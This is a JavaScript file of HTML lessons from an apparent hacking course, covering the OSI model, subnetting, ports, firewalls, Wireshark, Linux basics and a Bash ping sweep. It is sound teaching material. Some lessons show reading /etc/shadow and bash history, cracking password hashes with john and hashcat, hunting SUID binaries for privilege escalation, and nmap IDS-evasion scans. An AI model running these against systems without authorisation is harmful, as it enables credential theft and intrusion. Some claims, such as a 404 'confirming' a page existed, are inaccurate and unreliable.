// ── MODULES 02–06 LESSON CONTENT ──

window.MOD02 = { id:'mod02', title:'Network Fundamentals', lessons:{
  1:{title:'OSI Model Deep Dive: Layers 1–4',duration:'35 min',difficulty:'Beginner',html:`<h1>Lesson 11: OSI Model — Layers 1 to 4</h1><div class="lesson-meta"><span>⏱ 35 min</span><span>🎯 Beginner</span><span>📦 Module 02 · Lesson 1/10</span></div><p>The OSI (Open Systems Interconnection) Model divides network communication into 7 distinct layers, each with a specific role. Every attack, every defence, every protocol makes more sense through the lens of the OSI model.</p><div class="highlight-box">💡 <strong>Memory Aid:</strong> "Please Do Not Throw Sausage Pizza Away" — Physical, Data Link, Network, Transport, Session, Presentation, Application</div><h2>Layer 1: Physical Layer</h2><p>Transmits raw bits as electrical signals, light pulses, or radio waves.</p><ul><li><strong>Components:</strong> Cables, hubs, repeaters, NICs, wireless radio</li><li><strong>Threats:</strong> Physical tapping, wiretapping, wireless jamming</li></ul><h2>Layer 2: Data Link Layer</h2><p>Handles reliable transfer between directly connected nodes using MAC addresses.</p><ul><li><strong>Protocols:</strong> Ethernet, Wi-Fi (802.11), ARP</li><li><strong>Device:</strong> Switches, bridges</li><li><strong>Attacks:</strong> MAC spoofing, ARP poisoning (MitM), VLAN hopping</li></ul><div class="highlight-box">🎯 ARP is stateless with no authentication — this is why ARP poisoning attacks work.</div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># View ARP cache
arp -a
ip neigh show

# ARP process:
# 1. Host A broadcasts: "Who has 192.168.1.10?"
# 2. Host B replies: "192.168.1.10 is at AA:BB:CC:DD:EE:FF"
# 3. Host A caches mapping — NO AUTHENTICATION!</div><h2>Layer 3: Network Layer</h2><p>Handles routing across networks using IP addresses.</p><ul><li><strong>Protocols:</strong> IPv4, IPv6, ICMP, BGP, OSPF</li><li><strong>Devices:</strong> Routers, Layer 3 switches, firewalls</li><li><strong>Attacks:</strong> IP spoofing, BGP hijacking, ICMP floods, fragmentation attacks</li></ul><h2>Layer 4: Transport Layer</h2><table><tr><th>Feature</th><th>TCP</th><th>UDP</th></tr><tr><td>Connection</td><td>Connection-oriented</td><td>Connectionless</td></tr><tr><td>Reliability</td><td>Guaranteed delivery</td><td>Best effort</td></tr><tr><td>Speed</td><td>Slower (overhead)</td><td>Faster</td></tr><tr><td>Use cases</td><td>HTTP, SSH, FTP, email</td><td>DNS, VoIP, gaming, streaming</td></tr><tr><td>Attacks</td><td>SYN flood, session hijack</td><td>UDP flood, DNS amplification</td></tr></table>`},
  2:{title:'OSI Model Deep Dive: Layers 5–7',duration:'30 min',difficulty:'Beginner',html:`<h1>Lesson 12: OSI Model — Layers 5 to 7</h1><div class="lesson-meta"><span>⏱ 30 min</span><span>🎯 Beginner</span><span>📦 Module 02 · Lesson 2/10</span></div><p>The upper layers are where applications live and where most web-based attacks occur.</p><h2>Layer 5: Session Layer</h2><p>Manages sessions — establishing, maintaining, and terminating communication sessions. <strong>Security:</strong> Session hijacking, session fixation, and cookie theft all occur here.</p><h2>Layer 6: Presentation Layer</h2><p>Handles data formatting, encryption, and compression. SSL/TLS operates at this layer. <strong>Attacks:</strong> SSL stripping, certificate spoofing, encryption downgrade attacks.</p><h2>Layer 7: Application Layer</h2><p>The topmost layer users interact with directly.</p><table><tr><th>Protocol</th><th>Port</th><th>Purpose</th></tr><tr><td>HTTP</td><td>80</td><td>Web (unencrypted)</td></tr><tr><td>HTTPS</td><td>443</td><td>Encrypted web</td></tr><tr><td>FTP</td><td>21</td><td>File transfer</td></tr><tr><td>SSH</td><td>22</td><td>Secure remote shell</td></tr><tr><td>SMTP</td><td>25</td><td>Email sending</td></tr><tr><td>DNS</td><td>53</td><td>Name resolution</td></tr><tr><td>RDP</td><td>3389</td><td>Remote Desktop</td></tr><tr><td>LDAP</td><td>389</td><td>Directory services</td></tr></table><div class="highlight-box">🎯 SQL injection, XSS, CSRF, command injection — almost ALL web vulnerabilities are Layer 7 attacks.</div>`},
  3:{title:'IPv4 vs IPv6: Addressing & Structure',duration:'30 min',difficulty:'Beginner',html:`<h1>Lesson 13: IPv4 vs IPv6</h1><div class="lesson-meta"><span>⏱ 30 min</span><span>🎯 Beginner</span><span>📦 Module 02 · Lesson 3/10</span></div><h2>IPv4</h2><p>32-bit addresses (~4.3 billion unique). Written as four octets: 192.168.1.100</p><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Private ranges (RFC 1918 — not routable on internet)
10.0.0.0/8         # Large corp networks
172.16.0.0/12      # Medium private networks
192.168.0.0/16     # Home/small office

# Special
127.0.0.0/8        # Loopback (localhost)
169.254.0.0/16     # APIPA (DHCP failure fallback)</div><h2>IPv6</h2><p>128-bit addresses — 340 undecillion unique addresses. Written as 8 groups of hex: 2001:db8::8a2e:370:7334</p><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button">::1           # Loopback (like 127.0.0.1)
fe80::/10     # Link-local (LAN only)
2000::/3      # Global unicast (routable internet)</div><table><tr><th>Feature</th><th>IPv4</th><th>IPv6</th></tr><tr><td>Address size</td><td>32-bit</td><td>128-bit</td></tr><tr><td>NAT required</td><td>Yes</td><td>No</td></tr><tr><td>IPSec</td><td>Optional</td><td>Built-in</td></tr><tr><td>ARP</td><td>Uses ARP</td><td>Uses NDP</td></tr></table>`},
  4:{title:'Subnetting 101: CIDR Notation',duration:'35 min',difficulty:'Intermediate',html:`<h1>Lesson 14: Subnetting 101 — CIDR Notation</h1><div class="lesson-meta"><span>⏱ 35 min</span><span>🎯 Intermediate</span><span>📦 Module 02 · Lesson 4/10</span></div><p>Subnetting divides a network into smaller sub-networks. Understanding subnets tells you which hosts are in scope and how to route traffic during pentests.</p><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># CIDR Cheat Sheet
/32 =   1 host    (single host route)
/30 =   4 hosts   (2 usable — point-to-point)
/29 =   8 hosts   (6 usable)
/28 =  16 hosts   (14 usable)
/27 =  32 hosts   (30 usable)
/26 =  64 hosts   (62 usable)
/25 = 128 hosts   (126 usable)
/24 = 256 hosts   (254 usable) ← typical LAN
/16 = 65,536 hosts
/8  = 16.7M hosts</div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># ipcalc — subnet calculator
ipcalc 192.168.1.0/24

# Nmap scan entire subnet
nmap -sn 192.168.1.0/24

# Example: Target says "test 10.10.10.0/28"
# /28 = 16 addresses, 14 usable
# Range: 10.10.10.1 – 10.10.10.14</div>`},
  5:{title:'TCP vs UDP: The 3-Way Handshake',duration:'35 min',difficulty:'Beginner',html:`<h1>Lesson 15: TCP vs UDP — The 3-Way Handshake</h1><div class="lesson-meta"><span>⏱ 35 min</span><span>🎯 Beginner</span><span>📦 Module 02 · Lesson 5/10</span></div><div class="terminal"><div class="terminal-bar"><span class="t-dot t-red"></span><span class="t-dot t-amb"></span><span class="t-dot t-grn"></span><span class="terminal-title">tcp_handshake</span></div><div class="terminal-body"><span class="hl">CLIENT                          SERVER</span><br><span class="output">  |------- SYN (seq=100) -------->|  "I want to connect"</span><br><span class="hl">  |<-- SYN-ACK (seq=200,ack=101)--|  "OK, ready?"</span><br><span class="output">  |------- ACK (ack=201) -------->|  "Confirmed. Go!"</span><br><span class="hl">  |======== DATA FLOWS ==========>|</span></div></div><h2>TCP Flags</h2><table><tr><th>Flag</th><th>Meaning</th></tr><tr><td>SYN</td><td>Initiate connection</td></tr><tr><td>ACK</td><td>Acknowledge receipt</td></tr><tr><td>FIN</td><td>End connection gracefully</td></tr><tr><td>RST</td><td>Abort connection immediately</td></tr><tr><td>PSH</td><td>Send data without buffering</td></tr></table><h2>SYN Flood Attack</h2><p>Attacker sends thousands of SYN packets with spoofed source IPs. Server allocates resources for each half-open connection waiting for ACK packets that never arrive. The connection table fills → DoS.</p><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Nmap SYN scan (stealth — never completes handshake)
nmap -sS target.com

# Open port:   SYN → SYN-ACK received → RST sent
# Closed port: SYN → RST received
# Filtered:    SYN → No response (firewall drops packet)</div>`},
  6:{title:'DHCP & DNS: How Devices Get IPs',duration:'25 min',difficulty:'Beginner',html:`<h1>Lesson 16: DHCP & DNS</h1><div class="lesson-meta"><span>⏱ 25 min</span><span>🎯 Beginner</span><span>📦 Module 02 · Lesson 6/10</span></div><h2>DHCP — DORA Process</h2><div class="terminal"><div class="terminal-bar"><span class="t-dot t-red"></span><span class="t-dot t-amb"></span><span class="t-dot t-grn"></span><span class="terminal-title">dhcp_process</span></div><div class="terminal-body"><span class="output">1. DISCOVER → Client broadcasts: "Any DHCP server?"</span><br><span class="output">2. OFFER    ← Server: "I have 192.168.1.50 for you"</span><br><span class="output">3. REQUEST  → Client: "I'll take 192.168.1.50"</span><br><span class="hl">4. ACK      ← Server: "It's yours for 24 hours (lease)"</span><br><br><span class="hl">DHCP provides: IP, subnet mask, default gateway, DNS server</span></div></div><h2>DHCP Attacks</h2><ul><li><strong>DHCP Starvation:</strong> Flood server with fake MACs, exhaust IP pool → DoS</li><li><strong>Rogue DHCP:</strong> Set up own DHCP server → assign attacker as gateway → MitM</li></ul><h2>DNS Resolution</h2><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># DNS lookup chain for "google.com":
# 1. Browser cache
# 2. OS /etc/hosts file
# 3. Recursive resolver (your ISP or 8.8.8.8)
# 4. Root nameserver (13 globally)
# 5. .com TLD nameserver
# 6. Google's authoritative nameserver
# 7. Returns: 142.250.185.46</div><h2>DNS Attacks</h2><ul><li><strong>DNS Spoofing:</strong> Inject false records into resolver cache</li><li><strong>DNS Tunneling:</strong> Encode data in DNS queries to bypass firewalls</li><li><strong>DNS Amplification DDoS:</strong> Up to 70× traffic amplification using open resolvers</li></ul>`},
  7:{title:'Common Ports & Services',duration:'30 min',difficulty:'Beginner',html:`<h1>Lesson 17: Common Ports & Services</h1><div class="lesson-meta"><span>⏱ 30 min</span><span>🎯 Beginner</span><span>📦 Module 02 · Lesson 7/10</span></div><table><tr><th>Port</th><th>Service</th><th>Security Notes</th></tr><tr><td>21</td><td>FTP</td><td>Plaintext — credentials visible in traffic</td></tr><tr><td>22</td><td>SSH</td><td>Secure. Common brute-force target.</td></tr><tr><td>23</td><td>Telnet</td><td>Plaintext — never use in production</td></tr><tr><td>25</td><td>SMTP</td><td>Open relays allow spam abuse</td></tr><tr><td>53</td><td>DNS</td><td>Restrict zone transfers!</td></tr><tr><td>80</td><td>HTTP</td><td>Unencrypted — redirect to HTTPS</td></tr><tr><td>443</td><td>HTTPS</td><td>Primary encrypted web port</td></tr><tr><td>445</td><td>SMB</td><td>High-value attack target (EternalBlue!)</td></tr><tr><td>1433</td><td>MSSQL</td><td>Never expose to internet</td></tr><tr><td>3306</td><td>MySQL</td><td>Restrict to localhost</td></tr><tr><td>3389</td><td>RDP</td><td>Common brute-force target</td></tr><tr><td>5900</td><td>VNC</td><td>Often uses weak credentials</td></tr><tr><td>6379</td><td>Redis</td><td>Frequently misconfigured with no auth</td></tr><tr><td>27017</td><td>MongoDB</td><td>Often exposed with no auth</td></tr></table><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Nmap port scanning
nmap --top-ports 100 target.com
nmap -p 22,80,443,3389 target.com
nmap -sV -p- target.com      # All 65535 ports + version detection</div>`},
  8:{title:'Routers & Switches: Routing Through a LAN',duration:'25 min',difficulty:'Beginner',html:`<h1>Lesson 18: Routers & Switches</h1><div class="lesson-meta"><span>⏱ 25 min</span><span>🎯 Beginner</span><span>📦 Module 02 · Lesson 8/10</span></div><h2>Switches (Layer 2)</h2><p>Connects devices within the same LAN using MAC addresses. Maintains a MAC address table (port → MAC). If destination MAC is unknown → floods all ports.</p><div class="highlight-box">🎯 <strong>MAC Flooding Attack:</strong> Flood the switch with fake MACs to fill the MAC table → switch reverts to hub behaviour → attacker can sniff all traffic.</div><h2>Routers (Layer 3)</h2><p>Connects different networks using IP addresses and routing tables.</p><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># View routing table
ip route show
netstat -r

# Typical output:
# 192.168.1.0/24 dev eth0   → Local network
# 0.0.0.0/0 via 192.168.1.1 → Default route (internet)

# Traceroute — shows each router hop
traceroute google.com</div><h2>VLANs</h2><p>VLANs allow a single switch to be logically divided into multiple isolated networks — a primary tool for network segmentation. <strong>VLAN Hopping:</strong> Attacker tricks the switch into forwarding traffic across VLANs.</p>`},
  9:{title:'Firewalls & IDS/IPS: First Line of Defense',duration:'30 min',difficulty:'Intermediate',html:`<h1>Lesson 19: Firewalls & IDS/IPS</h1><div class="lesson-meta"><span>⏱ 30 min</span><span>🎯 Intermediate</span><span>📦 Module 02 · Lesson 9/10</span></div><table><tr><th>Type</th><th>Layer</th><th>How It Works</th></tr><tr><td>Packet Filter</td><td>3-4</td><td>Inspects IP/port headers only</td></tr><tr><td>Stateful</td><td>3-4</td><td>Tracks connection state</td></tr><tr><td>Application/WAF</td><td>7</td><td>Deep packet inspection</td></tr><tr><td>NGFW</td><td>2-7</td><td>All above + IPS + SSL inspection</td></tr></table><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># iptables rules example
iptables -A INPUT -p tcp --dport 22 -s 192.168.1.100 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables -A INPUT -j DROP   # Default deny</div><h2>IDS vs IPS</h2><p><strong>IDS:</strong> Monitors and alerts — doesn't block. Like a security camera.</p><p><strong>IPS:</strong> Monitors and blocks inline. Like a security guard.</p><h2>Nmap Firewall Evasion</h2><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Fragment packets
nmap -f target.com

# Use decoys to confuse IDS
nmap -D RND:10 target.com

# Very slow scan to avoid detection
nmap -T1 target.com

# Scan using trusted source port
nmap --source-port 80 target.com</div>`},
  10:{title:'Wireshark: Capturing and Reading Packets',duration:'40 min',difficulty:'Intermediate',html:`<h1>Lesson 20: Wireshark — Capturing & Reading Packets</h1><div class="lesson-meta"><span>⏱ 40 min</span><span>🎯 Intermediate</span><span>📦 Module 02 · Lesson 10/10</span></div><p>Wireshark is the world's most popular network protocol analyser. It captures traffic in real-time and allows you to inspect every byte of every packet.</p><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># tshark (command-line Wireshark)
tshark -i eth0                    # Capture live
tshark -i eth0 -w capture.pcap    # Save to file
tshark -r capture.pcap            # Read saved file
tshark -i eth0 -f "port 80"       # Capture filter</div><h2>Display Filters</h2><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Protocol filters
http          # HTTP only
dns           # DNS queries/responses
ftp           # FTP (credentials in plaintext!)

# IP filters
ip.addr == 192.168.1.1
ip.src == 192.168.1.1

# Port filters
tcp.port == 80
tcp.port == 22

# Find POST requests (may contain passwords!)
http.request.method == "POST"

# Right-click packet → Follow → TCP Stream
# Reconstructs the full conversation</div><div class="highlight-box">🏆 <strong>MODULE 02 COMPLETE!</strong> You now understand the OSI model, IPv4/IPv6, subnetting, TCP/UDP, DHCP/DNS, ports, routers/switches, firewalls/IDS, and Wireshark. Module 03: Linux awaits!</div>`},
}};

window.MOD03 = { id:'mod03', title:'Linux for Hackers', lessons:{
  1:{title:'Linux Architecture: Kernel, Shell & Filesystem',duration:'30 min',difficulty:'Beginner',html:`<h1>Lesson 21: Linux Architecture</h1><div class="lesson-meta"><span>⏱ 30 min</span><span>🎯 Beginner</span><span>📦 Module 03 · Lesson 1/10</span></div><p>Linux is the operating system of hacking. Understanding its architecture makes you faster and more precise in both exploitation and defence.</p><h2>Architecture Stack</h2><ul><li><strong>Hardware:</strong> Physical components — CPU, RAM, storage, NICs</li><li><strong>Kernel:</strong> Core OS — manages hardware, processes, memory, and system calls</li><li><strong>Shell:</strong> Command interpreter — translates user commands to kernel calls (Bash is default)</li><li><strong>Applications:</strong> Programs — nmap, Wireshark, Python scripts</li></ul><h2>Filesystem Hierarchy (FHS)</h2><table><tr><th>Directory</th><th>Contents</th><th>Security Relevance</th></tr><tr><td>/etc</td><td>Config files</td><td>passwd, shadow, ssh config, cron</td></tr><tr><td>/home</td><td>User home directories</td><td>SSH keys, bash history, personal files</td></tr><tr><td>/root</td><td>Root user home</td><td>Admin files, credentials</td></tr><tr><td>/var/log</td><td>System logs</td><td>Evidence of attacks and activity</td></tr><tr><td>/tmp</td><td>Temporary files</td><td>World-writable — common dropper location</td></tr><tr><td>/proc</td><td>Virtual filesystem</td><td>Running processes, kernel info</td></tr></table><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Critical files
cat /etc/passwd        # User accounts (UID, GID, home, shell)
sudo cat /etc/shadow   # Hashed passwords (root only)
cat /etc/crontab       # Scheduled tasks (priv esc target!)
ls -la ~/.ssh/         # SSH keys
cat ~/.bash_history    # Command history (intelligence goldmine)</div>`},
  2:{title:'Navigation Mastery: ls, cd, find, locate',duration:'25 min',difficulty:'Beginner',html:`<h1>Lesson 22: Navigation Mastery</h1><div class="lesson-meta"><span>⏱ 25 min</span><span>🎯 Beginner</span><span>📦 Module 03 · Lesson 2/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Navigation
pwd                              # Print working directory
ls -la                           # Long format + hidden files
ls -lt                           # Sort by modification time (newest first)
cd /etc                          # Absolute path
cd ..                            # Up one level
cd ~                             # Home directory

# find — powerful search
find / -name "*.conf" 2>/dev/null          # Config files
find / -perm -4000 2>/dev/null             # SUID files (priv esc!)
find / -writable -type d 2>/dev/null       # Writable directories
find / -mtime -1 -type f 2>/dev/null       # Modified in last 24h

# grep — search file contents
grep "password" /etc/apache2/*.conf
grep -r "password" /var/www/ 2>/dev/null
grep -i "PASSWORD" file.txt                # Case insensitive

# locate — fast (database-based, may be stale)
locate passwd
updatedb                                    # Refresh database</div>`},
  3:{title:'File Manipulation: touch, mkdir, nano, vim',duration:'25 min',difficulty:'Beginner',html:`<h1>Lesson 23: File Manipulation</h1><div class="lesson-meta"><span>⏱ 25 min</span><span>🎯 Beginner</span><span>📦 Module 03 · Lesson 3/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Create
touch file.txt
mkdir -p /path/to/deep/dir

# Copy / Move / Delete
cp file.txt backup.txt
cp -r /dir /backup
mv file.txt /home/user/
rm file.txt                  # No recycle bin!
rm -rf /directory/           # DANGEROUS — deletes everything recursively

# View contents
cat file.txt
less file.txt                # Page through (q to quit)
head -20 file.txt
tail -20 file.txt
tail -f /var/log/syslog      # Follow log in real-time

# Edit
nano file.txt                # Beginner-friendly
vim file.txt                 # Professional (see below)</div><h2>vim Quick Reference</h2><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># vim modes:
# Normal (default) → navigate
# Insert           → type text (press i to enter)
# Command          → :commands (press Esc then :)

:w          # Save
:q          # Quit
:wq         # Save and quit
:q!         # Quit WITHOUT saving

# Normal mode shortcuts:
dd          # Delete line
yy          # Copy line
p           # Paste
/pattern    # Search forward
n           # Next result</div>`},
  4:{title:'Permissions: chmod & chown',duration:'30 min',difficulty:'Intermediate',html:`<h1>Lesson 24: File Permissions — chmod & chown</h1><div class="lesson-meta"><span>⏱ 30 min</span><span>🎯 Intermediate</span><span>📦 Module 03 · Lesson 4/10</span></div><div class="terminal"><div class="terminal-bar"><span class="t-dot t-red"></span><span class="t-dot t-amb"></span><span class="t-dot t-grn"></span><span class="terminal-title">permission example</span></div><div class="terminal-body"><span class="prompt">root@zerotrace:~$</span> <span class="cmd">ls -la /etc/shadow</span><br><span class="hl">-rw-r----- 1 root shadow 1234 Jan 15 10:30 /etc/shadow</span><br><br><span class="output">Breaking it down: -rw-r-----</span><br><span class="output">Position 1:    - = regular file  (d=directory, l=symlink)</span><br><span class="output">Positions 2-4: rw- = owner perms (root: read + write)</span><br><span class="output">Positions 5-7: r-- = group perms (shadow group: read only)</span><br><span class="output">Positions 8-10: --- = other perms (everyone else: NO ACCESS)</span></div></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># chmod — change permissions (numeric mode)
chmod 755 script.sh   # rwx for owner, rx for group/other
chmod 644 file.txt    # rw for owner, r for group/other
chmod 600 id_rsa      # rw for owner ONLY (SSH keys must be this!)
chmod +x script.sh    # Add execute for all

# Common values: r=4, w=2, x=1
# 777 = rwxrwxrwx = DANGEROUS
# 700 = rwx------ = owner only

# chown — change owner
chown root:root file.txt
chown -R user:group /dir/

# SUID bit (4000) — runs as file OWNER
# If owned by root → temporary root privileges!
find / -perm -4000 -type f 2>/dev/null  # Find ALL suid binaries (priv esc!)</div>`},
  5:{title:'User Management & /etc/shadow',duration:'30 min',difficulty:'Intermediate',html:`<h1>Lesson 25: User Management & /etc/shadow</h1><div class="lesson-meta"><span>⏱ 30 min</span><span>🎯 Intermediate</span><span>📦 Module 03 · Lesson 5/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Current user info
whoami             # Username
id                 # UID, GID, groups
groups             # Group memberships

# User management
adduser newuser
usermod -aG sudo newuser     # Add to sudo group
userdel -r olduser           # Delete user + home dir

# Switch users
su - username                # Switch (full environment)
sudo command                 # Run as root
sudo -l                      # List sudo permissions (KEY priv esc check!)</div><h2>/etc/passwd Format</h2><div class="terminal"><div class="terminal-bar"><span class="t-dot t-red"></span><span class="t-dot t-amb"></span><span class="t-dot t-grn"></span><span class="terminal-title">/etc/passwd</span></div><div class="terminal-body"><span class="output">root:x:0:0:root:/root:/bin/bash</span><br><span class="hl"> |   | | |  |     |       └── Login shell</span><br><span class="hl"> |   | | |  |     └── Home directory</span><br><span class="hl"> |   | | |  └── GECOS comment</span><br><span class="hl"> |   | | └── GID</span><br><span class="hl"> |   | └── UID</span><br><span class="hl"> |   └── x = password stored in /etc/shadow</span><br><span class="hl"> └── Username</span></div></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Hash types in /etc/shadow:
# $1$  = MD5  (very weak — crack in seconds)
# $5$  = SHA-256
# $6$  = SHA-512 (current standard)

# Crack with john or hashcat
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
hashcat -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt</div>`},
  6:{title:'Process Management: top, ps, kill',duration:'20 min',difficulty:'Beginner',html:`<h1>Lesson 26: Process Management</h1><div class="lesson-meta"><span>⏱ 20 min</span><span>🎯 Beginner</span><span>📦 Module 03 · Lesson 6/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># Process listing
ps aux               # All processes, all users
ps aux | grep apache # Find specific process
ps aux | grep root   # Find processes running as root

# Real-time monitoring
top                  # Built-in process monitor
htop                 # Enhanced (install: sudo apt install htop)

# Kill processes
kill 1234            # Graceful (SIGTERM)
kill -9 1234         # Force kill (SIGKILL — cannot be caught)
killall apache2      # Kill all apache2 processes

# Background jobs
command &            # Run in background
jobs                 # List background jobs
fg 1                 # Bring job 1 to foreground

# System resources
free -h              # Memory usage
df -h                # Disk usage
uptime               # Load average</div>`},
  7:{title:'Network Configuration via CLI',duration:'25 min',difficulty:'Intermediate',html:`<h1>Lesson 27: Network Configuration via CLI</h1><div class="lesson-meta"><span>⏱ 25 min</span><span>🎯 Intermediate</span><span>📦 Module 03 · Lesson 7/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># ip command (modern, preferred)
ip addr show                                   # All interfaces
ip addr add 192.168.1.100/24 dev eth0         # Assign IP
ip link set eth0 up                            # Enable interface
ip route show                                  # Routing table
ip route add default via 192.168.1.1          # Set gateway

# ifconfig (legacy but still used)
ifconfig                                       # Show active interfaces
ifconfig eth0 192.168.1.100 netmask 255.255.255.0

# Diagnostics
ping -c 4 8.8.8.8    # Test connectivity
traceroute google.com # Trace hops to destination
netstat -tulpn        # Listening ports + PIDs
ss -tulpn             # Modern netstat replacement
nmap -sn 192.168.1.0/24  # Network host discovery

# DNS configuration
cat /etc/resolv.conf  # Current DNS servers
# Edit to change DNS:
# nameserver 8.8.8.8
# nameserver 1.1.1.1</div>`},
  8:{title:'Package Management: apt & dpkg',duration:'20 min',difficulty:'Beginner',html:`<h1>Lesson 28: Package Management</h1><div class="lesson-meta"><span>⏱ 20 min</span><span>🎯 Beginner</span><span>📦 Module 03 · Lesson 8/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button"># apt (Debian/Ubuntu/Kali)
sudo apt update                 # Update package list (DO THIS FIRST!)
sudo apt upgrade                # Upgrade all packages
sudo apt install nmap           # Install package
sudo apt install nmap wireshark metasploit-framework  # Multiple
sudo apt remove nmap            # Remove (keep config)
sudo apt purge nmap             # Remove + config files
sudo apt autoremove             # Clean unused dependencies
apt search keyword              # Search packages

# dpkg — low-level
dpkg -i package.deb             # Install .deb file
dpkg -l | grep nmap             # Check if installed

# Python packages
pip3 install requests
pip3 install -r requirements.txt

# Install tool from GitHub
git clone https://github.com/project/tool.git
cd tool
pip3 install -r requirements.txt
python3 tool.py</div>`},
  9:{title:'Bash Scripting I: Variables, Loops & If/Else',duration:'35 min',difficulty:'Intermediate',html:`<h1>Lesson 29: Bash Scripting I</h1><div class="lesson-meta"><span>⏱ 35 min</span><span>🎯 Intermediate</span><span>📦 Module 03 · Lesson 9/10</span></div><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button">#!/bin/bash
# Variables
name="ZeroTrace"
age=25
echo "Hello, $name! You are $age years old."

# Read input
read -p "Enter target IP: " target_ip
echo "Scanning: $target_ip"

# If/Else
if [ $age -gt 18 ]; then
    echo "Adult"
elif [ $age -eq 18 ]; then
    echo "Just 18"
else
    echo "Minor"
fi

# File tests
if [ -f /etc/passwd ]; then   echo "File exists"; fi
if [ -d /etc/ssh ];   then   echo "Dir exists";  fi

# For loop
for i in {1..254}; do
    echo "192.168.1.$i"
done

# Loop through files
for file in *.txt; do
    echo "Processing: $file"
done

# While loop
count=0
while [ $count -lt 5 ]; do
    echo "Count: $count"
    count=$((count + 1))
done

# Make executable and run
chmod +x script.sh
./script.sh</div>`},
  10:{title:'Bash Scripting II: Build a Network Scanner',duration:'40 min',difficulty:'Intermediate',html:`<h1>Lesson 30: Bash Scripting II — Network Scanner</h1><div class="lesson-meta"><span>⏱ 40 min</span><span>🎯 Intermediate</span><span>📦 Module 03 · Lesson 10/10</span></div><p>Let's build a real, functional network scanner using everything we've learned about Bash.</p><div class="code-block"><button class="copy-btn" onclick="ZT_copy(this)">COPY</button">#!/bin/bash
# ─────────────────────────────────────────
# ZeroTrace Network Discovery Script v1.0
# Usage: ./scanner.sh <subnet>
# Example: ./scanner.sh 192.168.1
# ─────────────────────────────────────────

GREEN='\033[0;32m'; RED='\033[0;31m'; AMBER='\033[1;33m'; NC='\033[0m'

echo -e "${GREEN}╔══════════════════════════════════╗"
echo    "║ ZERO TRACE NETWORK SCANNER v1.0  ║"
echo -e "╚══════════════════════════════════╝${NC}"

if [ -z "$1" ]; then
    echo -e "${RED}[!] Usage: $0 <subnet>${NC}"; exit 1
fi

SUBNET=$1
LIVE=0
OUTFILE="scan_$(date +%Y%m%d_%H%M%S).txt"

echo -e "${AMBER}[*] Scanning: ${SUBNET}.0/24${NC}"

for i in {1..254}; do
    IP="${SUBNET}.${i}"
    ping -c 1 -W 1 "$IP" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        HOSTNAME=$(nslookup "$IP" 2>/dev/null | grep "name = " | awk '{print $4}')
        echo -e "${GREEN}[+] LIVE: ${IP}  ${HOSTNAME}${NC}"
        echo "[+] $IP $HOSTNAME" >> "$OUTFILE"
        LIVE=$((LIVE + 1))
    fi
done

echo ""
echo -e "${AMBER}[*] Scan complete. Found ${GREEN}${LIVE}${AMBER} live hosts.${NC}"
echo "[*] Results saved to: $OUTFILE"</div><div class="highlight-box">🏆 <strong>MODULE 03 COMPLETE!</strong> You're now proficient in Linux — navigation, permissions, user management, processes, networking, packages, and Bash scripting. Module 04: Web Vulnerabilities awaits!</div>`},
}};

window.MOD04 = { id:'mod04', title:'Web Vulnerabilities', lessons:{
  1:{title:'How the Web Works: HTTP Requests & Responses',duration:'30 min',difficulty:'Beginner',html:`<h1>Lesson 31: How the Web Works — HTTP</h1><div class="lesson-meta"><span>⏱ 30 min</span><span>🎯 Beginner</span><span>📦 Module 04 · Lesson 1/10</span></div><div class="terminal"><div class="terminal-bar"><span class="t-dot t-red"></span><span class="t-dot t-amb"></span><span class="t-dot t-grn"></span><span class="terminal-title">http_request</span></div><div class="terminal-body"><span class="hl">GET /login.php?user=admin HTTP/1.1</span><br><span class="output">Host: example.com</span><br><span class="output">User-Agent: Mozilla/5.0</span><br><span class="output">Cookie: session=abc123; theme=dark</span><br><span class="output">Connection: keep-alive</span></div></div><h2>HTTP Methods</h2><table><tr><th>Method</th><th>Purpose</th><th>Security Note</th></tr><tr><td>GET</td><td>Retrieve resource</td><td>Params visible in URL and logs</td></tr><tr><td>POST</td><td>Submit data</td><td>Body data — not automatically "secure"</td></tr><tr><td>PUT</td><td>Update resource</td><td>Unrestricted upload risk</td></tr><tr><td>DELETE</td><td>Delete resource</td><td>Must require authentication</td></tr></table><h2>HTTP Response Codes</h2><table><tr><th>Code</th><th>Meaning</th><th>Pentest Note</th></tr><tr><td>200</td><td>OK</td><td>Request succeeded</td></tr><tr><td>403</td><td>Forbidden</td><td>Authenticated but no permission — bypass possible?</td></tr><tr><td>404</td><td>Not Found</td><td>vs 403 — confirms page once existed</td></tr><tr><td>500</td><td>Server Error</td><td>Potential SQLi or injection indicator!</td></tr></table><div class="code-block"><button 